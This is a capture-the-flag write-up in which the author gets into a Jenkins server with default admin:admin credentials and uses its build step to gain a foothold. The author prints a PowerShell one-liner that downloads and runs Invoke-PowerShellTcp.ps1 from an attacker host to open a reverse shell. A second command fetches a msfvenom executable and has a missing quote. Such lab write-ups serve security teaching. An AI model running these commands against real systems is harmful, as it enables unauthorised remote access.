#### Section 1 : Recon 

Let's kick it with a Nmap.

We can see that we have 2 http ports open. 
One on the port 80 and the other on port 8080.

Let's check them both.

On the first website we just have an Hearthbreaking news... Bruce Wayne is dead !

I gathered no useful informations, even when I inspected the image. 

On the second website, we have a login page to connect to a jenkins server.
_If you don't know what Jenkins is :_ 
[!jenkins](https://www.jenkins.io/)

I tried with default jenkins credential and with the famous admin:admin.
We are into the admin panel now !

The next task is to connect to the machin with a reverse shell with the help of powershell command.

We can see that we have a job avaible on the main page, click on it and go to the url: 
[!project](http://10.10.131.143:8080/job/project/)

We have a thing called "build" that we can run.

This build execute any action that we want, upload a file, run a shell etc...

Go to the configuration page, scroll down to the Build part and you will see a windows where a command run every time we run the build.

I used this powershell script to have a remote shell. 
```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.15.91:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.15.91 -Port 5555
```

Click save and prepare the file, a python server and a netcat listener. 

First, go to the github page to copy the command to a file called "Invoke-PowerShellTcp.ps1"
[!Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

You can see that I saved it in my directory prepared for the box.

In the same directory, launch your python server so the machine can download the file and execute it.

Last thing to setup, is a netcat listener on port 5555.

Now go back to the webpage and click on "Build now".

You can see on the terminal where the python server is running that the file got downloaded.
And on the netcat terminal, you will be in (normally).

You will be connected as bruce, go to his folder to find the user.txt

- msfvenom 

- python 

```bash
powershell "(New-Object Net.WebClient).DownloadFile('http://10.11.15.91:8000/reverse_tcp.exe,'reverse_tcp.exe')"
```

- launch msfconsole

Set up the payload 

- execute it on the build.
